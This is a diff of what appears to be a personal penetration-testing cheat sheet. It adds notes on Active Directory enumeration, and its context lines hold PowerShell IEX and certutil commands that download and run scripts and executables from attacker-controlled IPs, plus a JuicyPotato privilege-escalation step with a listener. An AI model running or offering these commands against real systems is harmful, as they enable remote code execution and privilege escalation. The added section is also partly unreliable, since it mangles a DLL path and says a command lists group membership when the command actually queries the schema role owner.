@@ -54,6 +54,23 @@
 	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"
 
 
+# AD exploitation
+	The secret to being able to run AD enumeration commands from the AD Powershell module on a system without RSAT installed, is the DLL located in 
+	C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management
+	
+	Import-Module C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.ManagementMicrosoft.ActiveDirectory.Management.dll
+	
+	Check domain:
+		nltest /domain_trusts
+	AD module install Powershell 
+		Install-WindowsFeature -Name "RSAT-AD-PowerShell" –IncludeAllSubFeature
+	The list of Active Directory groups in which the user is a member of can be displayed using the following commands:
+		([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).SchemaRoleOwner
+	
+	
+
+
+
 ## Certutils file download
 	certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
 
@@ -66,7 +83,6 @@
 				powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/shell_1338.ps1')
 			3. Start listener on 1338 and run jucypotato:
  				.\JuicyPotato.exe -t * -p shell.bat -l 1338
-
 
 
 ## Powershell execution restricted
